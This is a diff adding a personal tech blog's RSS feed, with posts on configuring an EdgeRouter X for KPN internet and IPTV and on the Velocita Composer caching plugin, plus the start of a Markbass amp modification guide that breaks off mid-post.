@@ -1,0 +1,1562 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Our Technical Narrative</title>
+	<atom:link href="https://jelleraaijmakers.nl/feed" rel="self" type="application/rss+xml" />
+	<link>https://jelleraaijmakers.nl/</link>
+	<description>Adventures in full stack development</description>
+	<lastBuildDate>Fri, 26 Apr 2024 13:34:00 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.9.1</generator>
+	<item>
+		<title>KPN Internet and IPTV with EdgeRouter X</title>
+		<link>https://jelleraaijmakers.nl/2021/11/kpn-internet-and-iptv-with-edgerouter-x</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Fri, 05 Nov 2021 14:39:34 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=373</guid>
+
+					<description><![CDATA[<p>If you are a customer of KPN and using their internet or IPTV services, you may want to replace their Experia Box. In my case, I wanted to replace this modem with my own Ubiquiti EdgeRouter X. Here are the changes I made to the router&#8217;s configuration to get internet and IPTV to work. Note: [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2021/11/kpn-internet-and-iptv-with-edgerouter-x">KPN Internet and IPTV with EdgeRouter X</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>If you are a customer of <a href="https://www.kpn.com/">KPN</a> and using their internet or IPTV services, you may want to replace their Experia Box. In my case, I wanted to replace this modem with my own Ubiquiti EdgeRouter X. Here are the changes I made to the router&#8217;s configuration to get internet and IPTV to work.</p>
+
+
+
+<span id="more-373"></span>
+
+
+
+<p><strong>Note: </strong>VOIP configuration is not included in the below examples.</p>
+
+
+
+<h2 class="wp-block-heading">General setup</h2>
+
+
+
+<p>We will use the following setup as a reference:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup.png"><img fetchpriority="high" decoding="async" src="https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup-1024x313.png" alt="Reference topology for KPN Internet and IPTV, EdgeRouter X and internal VLANs" class="wp-image-376" style="width:573px;height:174px" width="573" height="174" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup-1024x313.png 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup-300x92.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup-150x46.png 150w, https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup-768x235.png 768w, https://jelleraaijmakers.nl/wp-content/uploads/2021/11/kpn-edgerouter-setup.png 1383w" sizes="(max-width: 573px) 100vw, 573px" /></a><figcaption class="wp-element-caption">Reference topology</figcaption></figure>
+</div>
+
+
+<p>Our first goal is to get IPv4 and IPv6 internet working through the EdgeRouter for our internal VLAN 10. If that works, we are going to implement IPTV networking for internal VLAN 40. I will describe the configuration required to set this up, but will leave out a lot of default values and settings that are irrelevant in getting this to work.</p>
+
+
+
+<p>KPN has provided <a href="https://www.kpn.com/service/eigen-apparatuur.htm">their own documentation</a> for using your own modem. Make sure to read through that page so you understand what you are configuring.</p>
+
+
+
+<h2 class="wp-block-heading">Setting up KPN IPv4 internet</h2>
+
+
+
+<p>We start off by documenting the physical interface that our EdgeRouter is using to connect with the KPN FTTH device, in my case <code>eth3</code>:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    ethernet eth3 {
+        description "KPN uplink"
+    }
+}</pre>
+
+
+
+<p>Next, enable VLANs on your <code>switch0</code> and set up the VLANs 4 and 6 that are present on KPN&#8217;s side:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch 0 {
+        switch-port {
+            interface eth3 {
+                vlan {
+                    vid 4
+                    vid 6
+                }
+            }
+            vlan-aware enable
+        }
+    }
+}</pre>
+
+
+
+<p>Let&#8217;s get KPN internet working over IPv4. It is required to set up a <a href="https://en.wikipedia.org/wiki/Point-to-Point_Protocol_over_Ethernet">PPPoE</a> connection with them, in which our internet traffic will be encapsulated. We set this connection up in the <code>vif 6</code> of the switch:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch0 {
+         mtu 1512
+         vif 6 {
+             description "KPN Internet"
+             mtu 1508
+             pppoe 0 {
+                 default-route auto
+                 description "KPN Internet PPPoE"
+                 idle-timeout 180
+                 mtu 1500
+                 name-server auto
+                 password internet
+                 user-id internet
+             }
+         }
+
+    }
+}
+service {
+    nat {
+        rule 5000 {
+            description "Masquerade for WAN"
+            outbound-interface pppoe0
+            type masquerade
+        }
+    }
+}</pre>
+
+
+
+<p>Some notes on the above snippet:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Packets inside the <code>pppoe 0</code> tunnel are required to have an MTU of 1500. The outside MTUs of 1508 and 1512 allow for the increased size of the packets as a result of the packet headers.</li>
+
+
+
+<li>It should not matter what you use for <code>user-id</code> or <code>password</code>.</li>
+
+
+
+<li>The NAT rule will make sure that all outgoing packets will use your KPN WAN IPv4 address as the source IP address.</li>
+</ul>
+
+
+
+<p>The KPN IPv4 side of things should now be working &#8211; it&#8217;s time to configure our internet VLAN 10!</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch0 {
+        switch-port {
+            interface eth0 {
+                vlan {
+                    vid 10
+                }
+            }
+        }
+        vif 10 {
+            address 10.10.0.1/16
+            description Private
+        }
+    }
+}
+service {
+    dhcp-server {
+        disabled false
+        shared-network-name vlan10-private {
+            authoritative enable
+            subnet 10.10.0.0/16 {
+                lease 86400
+                start 10.10.1.1 {
+                    stop 10.10.1.254
+                }
+            }
+        }
+        use-dnsmasq enable
+    }
+    dns {
+        forwarding {
+            cache-size 10000
+            listen-on switch0.10
+            name-server 8.8.8.8
+            name-server 1.1.1.1
+            options strict-order
+        }
+    }
+}</pre>
+
+
+
+<p>This should be enough to get IPv4 internet working on your VLAN 10!</p>
+
+
+
+<ul class="wp-block-list">
+<li>I use the subnet <code>10.10.0.0/16</code> for VLAN 10. Make sure you update both the virtual interface and the DHCP server if you want to use a different subnet.</li>
+
+
+
+<li>I have found <code>dnsmasq</code> to work better as a DHCP server than the built-in <code>dhcpd</code>, but your mileage may vary. Remove <code>use-dnsmasq enable</code> if you&#8217;d like to try <code>dhcpd</code> instead.</li>
+
+
+
+<li>I&#8217;ve provided two DNS servers (Google and CloudFlare) as an example.</li>
+</ul>
+
+
+
+<p>After verifying that internet works, let&#8217;s make sure to set up our IPv4 firewall:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">firewall {
+    ip-src-route disable
+    log-martians enable
+    name ipv4-private-out {
+        default-action drop
+        description "IPv4 traffic to private VLAN"
+        rule 10 {
+            action accept
+            description "Allow related traffic"
+            state {
+                established enable
+                related enable
+            }
+        }
+    }
+    name ipv4-wan-in {
+        default-action drop
+        description "IPv4 traffic from WAN to internal network"
+        rule 10 {
+            action accept
+            description "Allow established/related"
+            state {
+                established enable
+                related enable
+            }
+        }
+        rule 20 {
+            action reject-tcp
+            description "Reject invalid conntrack with TCP reset"
+            protocol tcp
+            state {
+                invalid enable
+            }
+        }
+        rule 30 {
+            action reject
+            description "Reject invalid conntrack"
+            state {
+                invalid enable
+            }
+        }
+    }
+    name ipv4-wan-local {
+        default-action drop
+        description "IPv4 traffic from WAN to local router"
+        rule 10 {
+            action accept
+            description "Allow established/related"
+            state {
+                established enable
+                related enable
+            }
+        }
+        rule 20 {
+            action accept
+            description "Allow ping"
+            protocol icmp
+        }
+    }
+    name ipv4-wan-out {
+        default-action drop
+        description "IPv4 traffic from internal network to WAN"
+        rule 10 {
+            action accept
+            description "Allow new and related traffic"
+            state {
+                established enable
+                new enable
+                related enable
+            }
+        }
+        rule 20 {
+            action reject-tcp
+            description "Reject invalid conntrack with TCP reset"
+            protocol tcp
+            state {
+                invalid enable
+            }
+        }
+        rule 30 {
+            action reject
+            description "Reject invalid conntrack"
+            state {
+                invalid enable
+            }
+        }
+    }
+    receive-redirects disable
+    send-redirects enable
+    source-validation disable
+    syn-cookies enable
+}
+interfaces {
+    switch switch0 {
+        vif 6 {
+            pppoe 0 {
+                firewall {
+                    in {
+                        name ipv4-wan-in
+                    }
+                    local {
+                        name ipv4-wan-local
+                    }
+                    out {
+                        name ipv4-wan-out
+                    }
+                }
+            }
+        }
+        vif 10 {
+            firewall {
+                out {
+                    name ipv4-private-out
+                }
+            }
+        }
+    }
+}</pre>
+
+
+
+<h2 class="wp-block-heading">Setting up KPN IPv6 internet</h2>
+
+
+
+<p>The basic configuration for KPN IPv6 is relatively easy. However, the EdgeRouter X device requires a fix to one of its scripts in order to get an IPv6 address, which is discussed later on.</p>
+
+
+
+<p>Start off with enabling IPv6 on the <code>pppoe0</code> interface and VLAN 10:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch0 {
+        vif 6 {
+            pppoe 0 {
+                dhcpv6-pd {
+                    pd 0 {
+                        interface switch0.10 {
+                            no-dns
+                            prefix-id :1
+                            service slaac
+                        }
+                        prefix-length /48
+                    }
+                    rapid-commit enable
+                }
+                ipv6 {
+                    address {
+                        autoconf
+                    }
+                    dup-addr-detect-transmits 1
+                    enable {
+                    }
+                }
+            }
+        }
+        vif 10 {
+            ipv6 {
+                address {
+                    autoconf
+                }
+                dup-addr-detect-transmits 1
+            }
+        }
+    }
+}</pre>
+
+
+
+<p>Next, we need to add a static route to send all outgoing IPv6 packets over the <code>pppoe0</code> interface:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">protocols {
+    static {
+        interface-route6 ::/0 {
+            next-hop-interface pppoe0 {
+            }
+        }
+    }
+}</pre>
+
+
+
+<p>Finally, we need to apply a patch on the EdgeRouter X device to fix a bug &#8211; this is still relevant as of release <code>2.0.9-hotfix.7</code>:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="diff" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">--- a/opt/vyatta/share/perl5/Vyatta/Interface.pm
++++ b/opt/vyatta/share/perl5/Vyatta/Interface.pm
+@@ -212,14 +212,14 @@ sub ppp_path {
+            $path = "interfaces ethernet $intf pppoe $id";
+        } elsif ($intf =~ /(peth\d+)/) {
+            $path = "interfaces pseudo-ethernet $intf pppoe $id";
+-       } elsif ($intf =~ /(switch\d+)/) {
+-           $path = "interfaces switch $intf pppoe $id";
+        } elsif ($intf =~ /(switch\d+)\.(\d+)/) {
+            $path = "interfaces switch $1 vif $2 pppoe $id";
+-       } elsif ($intf =~ /(bridge\d+)/) {
+-           $path = "interfaces bridge $intf pppoe $id";
++       } elsif ($intf =~ /(switch\d+)/) {
++           $path = "interfaces switch $intf pppoe $id";
+        } elsif ($intf =~ /(bridge\d+)\.(\d+)/) {
+            $path = "interfaces bridge $1 vif $2 pppoe $id";
++       } elsif ($intf =~ /(bridge\d+)/) {
++           $path = "interfaces bridge $intf pppoe $id";
+        }
+        return $path if defined $path;
+}</pre>
+
+
+
+<p>For more instructions and context, see <a href="https://community.ui.com/questions/IPv6-bug-fix-dhcpv6-pd-config-not-generated-for-pppoe-on-switch-vif/04a16cc5-7a4f-4c56-bedf-541a369ae8bb">the source post</a> for this patch. After rebooting your EdgeRouter, IPv6 internet should be working!</p>
+
+
+
+<p>As with IPv4, let&#8217;s introduce the firewall next:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">firewall {
+    ipv6-name ipv6-wan-in {
+        default-action drop
+        description "IPv6 traffic from WAN to internal network"
+        rule 10 {
+            action accept
+            description "Allow related traffic"
+            state {
+                established enable
+                related enable
+            }
+        }
+        rule 20 {
+            action accept
+            description "Allow ICMPv6"
+            protocol icmpv6
+        }
+    }
+    ipv6-name ipv6-wan-local {
+        default-action drop
+        description "IPv6 traffic from WAN to local router"
+        enable-default-log
+        rule 10 {
+            action accept
+            description "Allow established/related"
+            state {
+                established enable
+                related enable
+            }
+        }
+        rule 20 {
+            action accept
+            description "Allow DHCPv6"
+            destination {
+                port 546
+            }
+            protocol udp
+            source {
+                port 547
+            }
+        }
+        rule 30 {
+            action accept
+            description "Allow ICMPv6"
+            protocol ipv6-icmp
+        }
+    }
+    ipv6-receive-redirects disable
+    ipv6-src-route disable
+}
+interfaces {
+    switch switch0 {
+        vif 6 {
+            pppoe 0 {
+                firewall {
+                    in {
+                        ipv6-name ipv6-wan-in
+                    }
+                    local {
+                        ipv6-name ipv6-wan-local
+                    }
+                }
+            }
+        }
+    }
+}</pre>
+
+
+
+<p>It is important to allow ICMPv6 traffic from the WAN. While ICMP is largely irrelevant for IPv4, the protocol plays a major role in proper handling of IPv6 connections.</p>
+
+
+
+<h2 class="wp-block-heading">Setting up KPN IPTV</h2>
+
+
+
+<p>Let&#8217;s configure KPN&#8217;s VLAN 4 first:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch0 {
+        vif 4 {
+            address dhcp
+            description "KPN IPTV"
+            dhcp-options {
+                client-option "send vendor-class-identifier &amp;quot;IPTV_RG&amp;quot;;"
+                client-option "request subnet-mask, routers, broadcast-address, rfc3442-classless-static-routes;"
+                default-route no-update
+                default-route-distance 210
+                name-server update
+            }
+            mtu 1500
+        }
+    }
+}
+service {
+    nat {
+        rule 5001 {
+            description IPTV
+            outbound-interface switch0.4
+            protocol all
+            type masquerade
+        }
+    }
+}</pre>
+
+
+
+<p>We need to send those very specific DHCP options to KPN&#8217;s DHCP server &#8211; without those options, we may not get an IP address assigned.</p>
+
+
+
+<p>Now we have KPN&#8217;s VLAN 4 network up and running, let&#8217;s configure our VLAN 40 for internal IPTV traffic with two TV boxes connected directly at <code>eth1</code> and <code>eth2</code>:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">interfaces {
+    switch switch0 {
+        switch-port {
+            interface eth1 {
+                vlan {
+                    pvid 40
+                }
+            }
+            interface eth2 {
+                vlan {
+                    pvid 40
+                }
+            }
+        }
+        vif 40 {
+            address 10.40.0.1/16
+            description IPTV
+        }
+    }
+}
+service {
+    dhcp-server {
+        shared-network-name vlan40-iptv {
+            authoritative enable
+            subnet 10.40.0.0/16 {
+                lease 86400
+                start 10.40.1.1 {
+                    stop 10.40.1.254
+                }
+            }
+        }
+    }
+    dns {
+        forwarding {
+            listen-on switch0.40
+        }
+    }
+}
+</pre>
+
+
+
+<p>Again, if you are using something different than <code>10.40.0.0/16</code> for your internal VLAN, make sure to update those values. If you have connected a VLAN-aware switch to a physical port of your EdgeRouter, use <code>vid</code> instead of <code>pvid</code>.</p>
+
+
+
+<p>We have now set up the IPTV networks, DHCP and DNS &#8211; but in order for IPTV to start working, we will need to support the IGMP protocol. KPN&#8217;s Experia Box has a built-in IGMP proxy that takes care of IGMP group management, so we will need an IGMP proxy as well:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">protocols {
+    igmp-proxy {
+        interface pppoe0 {
+            role disabled
+            threshold 1
+        }
+        interface switch0.4 {
+            alt-subnet 0.0.0.0/0
+            role upstream
+            threshold 1
+        }
+        interface switch0.10 {
+            role disabled
+            threshold 1
+        }
+        interface switch0.40 {
+            alt-subnet 10.40.0.0/16
+            role downstream
+            threshold 1
+        }
+    }
+}</pre>
+
+
+
+<p>We configure igmp-proxy to use KPN VLAN 4 (<code>switch0.4</code>) as upstream and internal VLAN 40 (<code>switch0.40</code>) as downstream. After saving and committing this configuration, our TV boxes should be working!</p>
+
+
+
+<p>The only thing left to do now, is to configure the IPTV firewall:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">firewall {
+    name ipv4-iptv-local {
+        default-action drop
+        description "IPv4 traffic from IPTV VLAN to local router"
+        rule 10 {
+            action accept
+            description "Allow ICMP to local router"
+            protocol icmp
+        }
+        rule 20 {
+            action accept
+            description "Allow DHCP"
+            destination {
+                port 67
+            }
+            protocol udp
+        }
+        rule 30 {
+            action accept
+            description "Allow DNS"
+            destination {
+                port 53
+            }
+            protocol udp
+        }
+        rule 40 {
+            action accept
+            description "Allow IGMP"
+            protocol igmp
+        }
+    }
+    name ipv4-kpn-iptv-in {
+        default-action drop
+        description "IPv4 IPTV traffic from KPN to internal network"
+        rule 10 {
+            action accept
+            description "Allow related traffic"
+            state {
+                established enable
+                related enable
+            }
+        }
+        rule 20 {
+            action accept
+            description "Allow IPTV broadcasts"
+            destination {
+                address 224.0.0.0/4
+            }
+            protocol udp
+        }
+    }
+    name ipv4-kpn-iptv-local {
+        default-action drop
+        description "IPv4 IPTV traffic from KPN to local router"
+        rule 10 {
+            action accept
+            description "Allow IGMP"
+            protocol igmp
+        }
+    }
+    name ipv4-kpn-iptv-out {
+        default-action drop
+        description "IPTV traffic from internal network to KPN"
+        rule 10 {
+            action accept
+            description "Allow traffic from IPTV subnet"
+            source {
+                address 10.40.0.0/16
+            }
+        }
+    }
+}
+interfaces {
+    switch switch0 {
+        vif 4 {
+            firewall {
+                in {
+                    name ipv4-kpn-iptv-in
+                }
+                local {
+                    name ipv4-kpn-iptv-local
+                }
+                out {
+                    name ipv4-kpn-iptv-out
+                }
+            }
+        }
+        vif 40 {
+            firewall {
+                local {
+                    name ipv4-iptv-local
+                }
+            }
+        }
+    }
+}</pre>
+
+
+
+<p><a href="mailto:jelle@gmta.nl">Let me know</a> if this has helped you set up your internet and IPTV!</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2021/11/kpn-internet-and-iptv-with-edgerouter-x">KPN Internet and IPTV with EdgeRouter X</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Velocita: fast and reliable Composer installs</title>
+		<link>https://jelleraaijmakers.nl/2020/08/velocita-fast-and-reliable-composer-installs</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Tue, 11 Aug 2020 12:28:26 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Performance]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Programming]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=332</guid>
+
+					<description><![CDATA[<p>Introducing Velocita: a Composer plugin that works together with a caching reverse proxy to speed up package downloads and to provide a fallback if the original source (e.g. GitHub or Packagist) is experiencing downtime. Usage Let&#8217;s get right to it: Note that the proxy (step 1) can be shared between multiple projects and developers. Installing [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2020/08/velocita-fast-and-reliable-composer-installs">Velocita: fast and reliable Composer installs</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>Introducing Velocita: a Composer plugin that works together with a caching reverse proxy to speed up package downloads and to provide a fallback if the original source (e.g. GitHub or Packagist) is experiencing downtime.</p>
+
+
+
+<span id="more-332"></span>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview.png"><img decoding="async" width="1024" height="327" src="https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-1024x327.png" alt="" class="wp-image-405" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-1024x327.png 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-300x96.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-150x48.png 150w, https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-768x245.png 768w, https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview-1536x490.png 1536w, https://jelleraaijmakers.nl/wp-content/uploads/2022/06/velocita-overview.png 1806w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>
+
+
+
+<h2 class="wp-block-heading">Usage</h2>
+
+
+
+<p>Let&#8217;s get right to it:</p>
+
+
+
+<ol class="wp-block-list">
+<li>Run a <a href="https://github.com/gmta/velocita-proxy">Velocita Proxy</a> instance</li>
+
+
+
+<li>Install the <a href="https://github.com/gmta/composer-velocita">Velocita Composer plugin</a> globally by running:<br><code>composer global config allow-plugins.gmta/composer-velocita true</code><br><code>composer global require gmta/composer-velocita</code></li>
+
+
+
+<li>Point the plugin to your Velocita Proxy instance:<br><code>composer velocita:enable https://url.to.your.velocita.tld</code></li>
+</ol>
+
+
+
+<p>Note that the proxy (step 1) can be shared between multiple projects and developers. Installing the plugin (step 2 and 3) is something that you do just once on your development machine, for example.</p>
+
+
+
+<h2 class="wp-block-heading">Performance</h2>
+
+
+
+<p>Velocita already allows you to continue working with Composer when upstream servers are experiencing downtime. Additionally, it achieves a significant performance improvement just by being a webserver in your local network:</p>
+
+
+
+<figure class="wp-block-table is-style-regular"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-left" data-align="left">Configuration</th><th class="has-text-align-center" data-align="center">Duration</th><th class="has-text-align-center" data-align="center">Relative</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">Composer</td><td class="has-text-align-center" data-align="center">2.2s ± 0.1s</td><td class="has-text-align-center" data-align="center">100%</td></tr><tr><td class="has-text-align-left" data-align="left">Composer + Velocita</td><td class="has-text-align-center" data-align="center">0.5s ± 0.1s</td><td class="has-text-align-center" data-align="center">23%</td></tr></tbody></table><figcaption class="wp-element-caption">↑ Results of <code>composer require phpunit/phpunit:9.5.19</code></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-table is-style-regular"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-left" data-align="left">Configuration</th><th class="has-text-align-center" data-align="center">Duration</th><th class="has-text-align-center" data-align="center">Relative</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">Composer + Symfony Flex</td><td class="has-text-align-center" data-align="center">4.7s ± 0.7s</td><td class="has-text-align-center" data-align="center">100%</td></tr><tr><td class="has-text-align-left" data-align="left">Composer + Symfony Flex + Velocita</td><td class="has-text-align-center" data-align="center">1.6s ± 0.2s</td><td class="has-text-align-center" data-align="center">35%</td></tr></tbody></table><figcaption class="wp-element-caption">↑ Results of <code>composer create-project symfony/skeleton:v6.0.99 symfony</code></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<p>You can find more details about these measurements in the <a href="https://github.com/gmta/velocita-proxy#performance">README</a>.</p>
+
+
+
+<h2 class="wp-block-heading">How it works</h2>
+
+
+
+<p>Internally, Velocita Proxy generates a reverse proxy configuration for Nginx and the Velocita Composer plugin redirects all supported URLs to the proxy. Using environment variables, you can configure different mirrors and set caching parameters.</p>
+
+
+
+<p>No changes are required to either your <code>composer.json</code> or <code>composer.lock</code> files, which means that your projects stay fully compatible with developers that do not use Velocita.</p>
+
+
+
+<h2 class="wp-block-heading">Why use Velocita?</h2>
+
+
+
+<p>In one of my development teams, we use Composer for our PHP-based applications and tools to pull in dependencies for development and automated deployments. Although Composer does a good job of resolving dependencies, it can lack in speed and reliability.</p>
+
+
+
+<p>These are some of the issues that we experienced during regular PHP development and deployments:</p>
+
+
+
+<ul class="wp-block-list">
+<li>The GitHub API rate limited (blocked) our requests, requiring authentication to circumvent;</li>
+
+
+
+<li>Packagist experienced downtime, preventing us from installing packages;</li>
+
+
+
+<li>GitHub Codeload downloads were throttled to the point were they became unusable;</li>
+
+
+
+<li>A 3<sup>rd</sup> party Composer repository decided to go offline;</li>
+
+
+
+<li>Our ISP decided that using heavy machinery to dig through our fiber-optic was the best course of action.</li>
+</ul>
+
+
+
+<p>I believe that in software development, performance and repeatability are two important aspects in improving developer experience and decreasing the length of development iterations. Velocita speeds up <code>composer install</code> by offering a shared cache and if configured correctly, allows you to build projects even when faced with a total ISP outage.</p>
+
+
+
+<h2 class="wp-block-heading">Didn&#8217;t we already have something like this?</h2>
+
+
+
+<p>You might be thinking of <a href="https://toranproxy.com/">Toran Proxy</a>, which is now phased out in favor of Private Packagist &#8211; a paid solution that requires you to change your packages&#8217; distribution URL. I strongly feel that having an open source and free to use solution helps the PHP community as a whole without conflicting with Private Packagist&#8217;s main goal: offering a private package repository.</p>
+
+
+
+<p><a href="https://github.com/composer/satis">Satis</a> is another solution for hosting private packages and preemptively downloading dependencies to use as a cache of sorts. However, it requires coding to integrate with your projects&#8217; repositories and you need to add a new Composer repository in your project&#8217;s <code>composer.json</code> to make it work.</p>
+
+
+
+<p>Setting <code>packagist</code> to <code>false</code> in <code>composer.json</code> and adding a new repository location can seem like a good solution which does not require a plugin. However, this will also update the distribution URLs in your <code>composer.lock</code> limiting your ability to share that project with other developers. In contrast, Velocita enables you to enable or disable specific mirrors in the central proxy location without changes required in either the projects or the developers&#8217; machines.</p>
+
+
+
+<h2 class="wp-block-heading">Awesome!</h2>
+
+
+
+<p>I would love to <a href="mailto:jelle@gmta.nl">hear from you</a> if Velocita has helped your projects or teams. Check out the <a href="https://github.com/gmta/velocita-proxy">Velocita Proxy</a> and <a href="https://github.com/gmta/composer-velocita">Composer Velocita</a> projects on GitHub and feel free to raise issues or send in pull requests.</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2020/08/velocita-fast-and-reliable-composer-installs">Velocita: fast and reliable Composer installs</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Effects loop: parallel to series for Markbass LM III</title>
+		<link>https://jelleraaijmakers.nl/2017/01/effects-loop-parallel-series-markbass</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Sun, 22 Jan 2017 14:15:43 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=291</guid>
+
+					<description><![CDATA[<p>The Markbass Little Mark III series of amps sound great but all have the same issue: the effects loop is set in parallel and there is no way to adjust the blend on the signals. Let&#8217;s change the loop to series! What products does this apply to? As far as I know, the hardware for the following [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2017/01/effects-loop-parallel-series-markbass">Effects loop: parallel to series for Markbass LM III</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>The Markbass Little Mark III series of amps sound great but all have the same issue: the effects loop is set in parallel and there is no way to adjust the blend on the signals. Let&#8217;s change the loop to series!</p>
+<p><span id="more-291"></span></p>
+<h2>What products does this apply to?</h2>
+<p>As far as I know, the hardware for the following solid state amps is nearly identical:</p>
+<ul>
+<li>Little Mark III</li>
+<li>Little Mark 250</li>
+<li>Little Mark 800</li>
+<li>Combo Head II</li>
+</ul>
+<p>There&#8217;s a chance that this also works for the Little Mark Tube and Little Mark Tube 800. Keep in mind that if you want to retain your warranty, you might be better off letting the Markbass technicians do their thing. If not, read on!</p>
+<h2>Changing the effects loop to series</h2>
+<p>I have a Markbass CMD 102P which contains the Combo Head II, so the photos below reference that model. Don&#8217;t forgot to make the necessary mental adjustments to accommodate the instructions for your own amp!</p>
+<p>Fully disconnect and open up your amp (or slide it out of the casing) to reveal the innards:</p>
